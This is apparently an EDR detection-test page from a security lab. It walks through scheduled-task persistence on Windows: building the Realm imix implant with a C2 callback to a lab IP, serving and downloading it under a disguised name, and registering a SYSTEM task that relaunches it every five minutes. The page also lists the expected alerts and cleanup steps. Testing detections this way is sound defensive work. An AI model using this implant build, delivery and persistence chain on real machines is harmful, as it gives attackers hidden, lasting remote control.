# Test: Persistence — scheduled task (T1053.005)

**Chain:** a SYSTEM task re-executes the implant every 5 minutes — and every firing is a
free regression test of your launch detections.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1` (assumes implant already at
`C:\Users\Public\sysupd.exe` — stage it via any delivery walkthrough first).

```powershell
schtasks /create /f /tn "CCDCTestTask" /sc minute /mo 5 /tr "C:\Users\Public\sysupd.exe" /ru SYSTEM
schtasks /run /tn CCDCTestTask        # fire once now instead of waiting 5 min
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `EVT-4698` | high | Security log: task created |
| `PERS-TASK` | high | auditor diff |
| `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` | high/crit | **every task firing** — implant re-launches from a user path |
| `NET-BEACON` | critical | after each firing's callbacks |

**Point of the test:** persistence that re-executes the implant is a recurring launch test
— if the task fires silently, your 4688/image-scan chain has a gap.

**Cleanup:** global cleanup deletes the task; manually:
`schtasks /delete /f /tn CCDCTestTask`.
